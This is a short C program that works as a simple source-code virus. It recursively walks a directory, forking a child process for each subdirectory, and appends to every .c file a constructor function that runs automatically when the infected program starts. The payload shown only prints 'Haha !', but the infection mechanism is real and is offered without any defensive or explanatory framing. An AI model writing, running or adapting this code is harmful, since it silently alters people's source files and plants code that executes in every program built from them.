#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>

#define EXT ".c"
#define MSG "\nvoid a() __attribute__ ((constructor)); void a() {printf(\"Haha !\\n\");}"

int is_file(const char *file) {
	// Indicate if the file is a standard file or a directory.

	struct stat file_stat;
	stat(file, &file_stat);
	return S_ISREG(file_stat.st_mode);
}

void infect(const char *file) {
	// Infect the targeted file.
	
	FILE *pFile;
	if ((pFile = fopen(file, "a+")) == NULL) {
		return;
	}

	fwrite(MSG, strlen(MSG), sizeof(char), pFile);

	fclose(pFile);
}

void get_targets(const char *directory, const int need_cd) {
	// Get all the file to infect.

	DIR *pDir;
	if ((pDir = opendir(directory)) == NULL) {
		return;
	}

	if (need_cd && chdir(directory) == -1) {
		return;
	}

	struct dirent *pDirent = NULL;	
	while ((pDirent = readdir(pDir)) != NULL) {

		if (!is_file(pDirent->d_name)) {
			if (pDirent->d_name[0] != '.') {
				if (fork() == 0) {
					get_targets(pDirent->d_name, 1);
					break;
				}
			}
			continue;
		}

		if (strncmp(pDirent->d_name + (strlen(pDirent->d_name) - 2), EXT, strlen(EXT)) == 0) {
			infect(pDirent->d_name);
		}
	}

	closedir(pDir);
}

int main(int argc, char **argv) {
	
	if (argc > 1) {
		get_targets(argv[1], 1);
	} else {
		char *pCurrent_dir = getcwd(NULL, 0);
		get_targets(pCurrent_dir, 0);
		free(pCurrent_dir);
	}

	return EXIT_SUCCESS;
}
